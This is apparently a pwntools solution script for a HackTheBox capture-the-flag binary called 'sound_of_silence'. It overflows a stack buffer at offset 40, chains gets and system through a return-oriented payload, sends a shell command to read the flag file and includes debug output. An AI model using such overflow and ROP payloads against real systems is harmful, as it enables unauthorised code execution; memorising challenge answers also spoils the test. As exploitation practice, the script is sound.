'''
cyclic 1024
cyclic -l jaaa
36+4 == 40

0x00000000004004de : ret
'''

#!/usr/bin/python3

from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'

offset = 40

elf = ELF('./sound_of_silence')
#libc = ELF('./glibc/libc.so.6')

padding = offset*b'A'

#ip, port='161.35.168.118', 30070
#ip, port = '83.136.250.41', 46944   #HTB
#io = remote(ip,port)
io = process('./sound_of_silence')
#io = gdb.debug('./sound_of_silence','break main')

#gets + system
rop_chain = p64(elf.sym.gets) + p64(elf.sym.system)

payload = padding + rop_chain

io.recvuntil('>>')
io.sendline(payload)
cmd = b'cat glag.txt'
io.sendline(cmd)
print(io.recvall())
#io.interactive()

'''
flag -> elag
glag -> flag

[DEBUG] Sent 0xd bytes:
    b'cat flag.txt\n'
[+] Receiving all data: Done (42B)
[DEBUG] Received 0xd bytes:
    b'cat: elag.txt'
[DEBUG] Received 0x1c bytes:
    b': No such file or directory\n'

'''
